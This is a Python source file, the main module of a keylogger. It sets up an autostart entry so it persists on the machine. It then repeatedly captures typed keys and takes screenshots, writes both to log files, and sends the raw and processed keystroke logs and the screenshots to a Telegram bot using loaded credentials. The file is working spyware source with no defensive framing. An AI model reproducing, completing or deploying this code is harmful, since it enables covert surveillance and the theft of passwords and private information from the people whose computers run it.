import os
import sys

import credentials
from constants import LOG_FILE, LOG_FILE_2, TIME_OUT
from key_listener import KeyListener
from keylogger_utils import (
    create_autostart_entry,
    take_screenshot,
)
from log_utils import format_message, process_keys, write_to_log
from notifications_utils import send_image_telegram, send_info_telegram


def handle_keyboard_interrupt(key_listener):
    """
    Handle a keyboard interrupt event.

    Parameters:
        - key_listener (Key_Listener): The key listener object that captures the typed keys.
    """
    # Capture typed keys and process them
    typed_keys = key_listener.get_keys()
    processed_keys = process_keys(typed_keys)
    message = format_message(typed_keys)
    processed_message = format_message(processed_keys)

    # Take screnshot and save it as a PNG file
    screenshot = take_screenshot()

    # Write the message to the log file
    write_to_log(message, LOG_FILE)
    write_to_log(processed_message, LOG_FILE_2)

    creds = credentials.get_credentials_telegram()

    # Load credentials a pass to send logs through Telegram
    send_info_telegram(**creds, message='RAW KEYLOGGER LOG\n\n' + message)
    send_info_telegram(**creds,
                       message='PROCESSED KEYLOGGER LOG\n\n' +
                       processed_message)
    send_image_telegram(**creds, image=screenshot)

    try:
        sys.exit(130)
    except SystemExit:
        os._exit(130)


# --------------------- MAIN --------------------- #


def main():
    key_listener = KeyListener()
    create_autostart_entry()
    try:
        while True:
            # Capture typed keys and process them
            typed_keys = key_listener.read_keys(TIME_OUT)
            processed_keys = process_keys(typed_keys)
            message = format_message(typed_keys)
            processed_message = format_message(processed_keys)

            # Take screnshot and save it as a PNG file
            screenshot = take_screenshot()

            # Write the message to the log file
            write_to_log(message, LOG_FILE)
            write_to_log(processed_message, LOG_FILE_2)

            creds = credentials.get_credentials_telegram()

            # Load credentials a pass to send logs through Telegram
            send_info_telegram(**creds,
                               message='RAW KEYLOGGER LOG\n\n' + message)
            send_info_telegram(**creds,
                               message='PROCESSED KEYLOGGER LOG\n\n' +
                               processed_message)
            if screenshot is not None:
                send_image_telegram(**creds, image=screenshot)

    except KeyboardInterrupt:
        handle_keyboard_interrupt(key_listener)


if __name__ == "__main__":
    main()
